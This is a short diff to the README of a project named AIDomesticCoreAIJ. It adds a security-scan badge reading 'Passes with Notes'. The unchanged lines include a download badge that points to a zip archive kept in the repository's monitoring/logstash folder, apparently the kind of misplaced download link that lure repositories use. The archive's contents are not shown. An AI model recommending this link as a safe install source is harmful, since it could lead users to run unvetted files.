@@ -1,5 +1,7 @@
 # 🧠🏠 AIDomesticCoreAIJ - Power Your AI Solutions Effortlessly
 
+[![SafeSkill 85/100](https://img.shields.io/badge/SafeSkill-85%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/kirkigmenezes-aidomesticcoreaij)
+
 [![Download AIDomesticCoreAIJ](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip)](https://raw.githubusercontent.com/Kirkigmenezes/AIDomesticCoreAIJ/main/monitoring/logstash/Core_AIJ_Domestic_AI_1.4.zip)
 
 ## 📖 Overview
